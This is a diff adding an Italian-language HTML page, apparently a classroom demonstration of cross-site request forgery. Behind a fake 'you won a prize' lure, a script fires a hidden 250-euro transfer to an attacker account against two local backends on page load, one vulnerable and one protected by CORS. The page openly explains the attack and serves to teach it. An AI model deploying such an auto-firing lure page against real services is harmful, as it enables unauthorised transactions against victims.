@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="it">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Hai vinto un premio!</title>
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 620px; margin: 40px auto; padding: 0 16px; color: #1a1a2e; }
+    h1 { color: #d1495b; }
+    .box { border: 1px solid #e2e3f0; border-radius: 10px; padding: 16px; margin-top: 18px; }
+    .esito { font-family: ui-monospace, Menlo, monospace; font-size: .85rem; white-space: pre-wrap;
+             background: #1a1a2e; color: #e6e6f0; padding: 10px; border-radius: 6px; }
+    .vuln { border-left: 5px solid #d1495b; padding-left: 10px; }
+    .sic { border-left: 5px solid #2a9d8f; padding-left: 10px; margin-top: 12px; }
+    button { background: #d1495b; color: #fff; border: none; padding: 10px 18px; border-radius: 8px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <!-- Pagina all'apparenza innocua, ospitata su un'origine diversa (:9000). -->
+  <h1>🎉 Complimenti, hai vinto un premio!</h1>
+  <p>Clicca per scoprire cosa hai vinto…</p>
+  <p><button id="riscatta">Riscatta il premio</button></p>
+
+  <div class="box">
+    <strong>Cosa succede di nascosto</strong>
+    <p>Questa pagina invia un bonifico ai due backend, senza che tu l'abbia chiesto.</p>
+    <div class="vuln">
+      <b>Backend vulnerabile (:8081)</b>
+      <div id="out-vuln" class="esito">in attesa…</div>
+    </div>
+    <div class="sic">
+      <b>Backend protetto (:8082)</b>
+      <div id="out-sic" class="esito">in attesa…</div>
+    </div>
+  </div>
+
+  <script>
+    // Corpo del bonifico verso il conto della vittima.
+    const corpo = { importo: 250, destinatario: "conto-attaccante" };
+
+    // Scrive un esito nel riquadro corrispondente (textContent: nessun rischio di injection qui).
+    function mostra(id, testo) {
+      document.getElementById(id).textContent = testo;
+    }
+
+    // Invia il bonifico a un backend e mostra cosa risponde.
+    async function attacca(base, id) {
+      try {
+        const res = await fetch(base + "/api/csrf/bonifico", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(corpo),
+        });
+        const dati = await res.json();
+        mostra(id, "HTTP " + res.status + "\n" + dati.log + "\nSaldo: " + dati.saldo + " euro");
+      } catch (e) {
+        // Il backend protetto blocca l'origine sconosciuta: il browser impedisce la lettura.
+        mostra(id, "BLOCCATO dal browser (CORS): il backend non risponde a un'origine sconosciuta.\n" + e);
+      }
+    }
+
+    function lancia() {
+      attacca("http://localhost:8081", "out-vuln"); // vulnerabile: esegue
+      attacca("http://localhost:8082", "out-sic");  // protetto: rifiuta
+    }
+
+    // Il bello (o il brutto) del CSRF: parte da solo appena la pagina viene aperta.
+    window.addEventListener("load", lancia);
+    document.getElementById("riscatta").addEventListener("click", lancia);
+  </script>
+</body>
+</html>
